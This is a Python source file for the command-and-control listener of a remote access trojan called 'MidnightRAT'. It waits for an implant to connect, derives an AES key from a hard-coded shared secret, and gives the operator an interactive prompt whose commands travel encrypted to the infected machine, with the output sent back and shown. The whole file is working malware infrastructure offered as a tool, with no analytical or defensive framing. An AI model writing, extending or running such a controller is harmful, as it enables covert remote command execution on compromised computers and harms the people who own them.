#!/usr/bin/env python3
"""
MidnightRAT - Encrypted C2 Listener
Author: Syed Sharjeel Zaidi
Purpose: Receive and send AES-encrypted commands to the RAT payload
"""

import socket
import struct
import json
import uuid
from base64 import b64encode, b64decode
from cryptography.hazmat.primitives import hashes, padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend


# === Configuration ===
C2_HOST = "0.0.0.0"
C2_PORT = 8080
SHARED_SECRET = b"k3yshar3dsecr3t123!"


# === Crypto Utils ===
def derive_key(secret: bytes, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return kdf.derive(secret)


def encrypt(data: bytes, key: bytes) -> bytes:
    iv = uuid.uuid4().bytes[:16]
    padder = padding.PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return iv + encryptor.update(padded) + encryptor.finalize()


def decrypt(data: bytes, key: bytes) -> bytes:
    iv = data[:16]
    ciphertext = data[16:]
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded_plain = decryptor.update(ciphertext) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    return unpadder.update(padded_plain) + unpadder.finalize()


# === Listener Setup ===
def start_listener():
    print(f"[*] Starting listener on {C2_HOST}:{C2_PORT}...")
    sock = socket.socket()
    sock.bind((C2_HOST, C2_PORT))
    sock.listen(1)

    conn, addr = sock.accept()
    print(f"[+] Connection received from {addr[0]}:{addr[1]}")

    # Derive same key as RAT (random salt per session)
    salt = conn.recv(16)
    key = derive_key(SHARED_SECRET, salt)
    print("[*] Key derived. Ready to send commands.")

    while True:
        try:
            cmd = input("MidnightRAT > ").strip()
            if not cmd:
                continue
            if cmd.lower() in ["exit", "quit"]:
                print("[*] Exiting...")
                break

            cmd_packet = json.dumps({
                "type": "syscall",
                "data": cmd
            }).encode()

            encrypted_cmd = encrypt(cmd_packet, key)
            conn.sendall(struct.pack(">I", len(encrypted_cmd)) + encrypted_cmd)

            # Receive encrypted response
            raw_len = conn.recv(4)
            if not raw_len:
                print("[!] Connection closed by client.")
                break
            resp_len = struct.unpack(">I", raw_len)[0]
            encrypted_resp = conn.recv(resp_len)
            response = decrypt(encrypted_resp, key)

            print("\n[Response from RAT]:\n")
            print(response.decode(errors="ignore"))
            print("-" * 50)

        except Exception as e:
            print(f"[ERROR] {e}")
            break

    conn.close()


if __name__ == "__main__":
    start_listener()
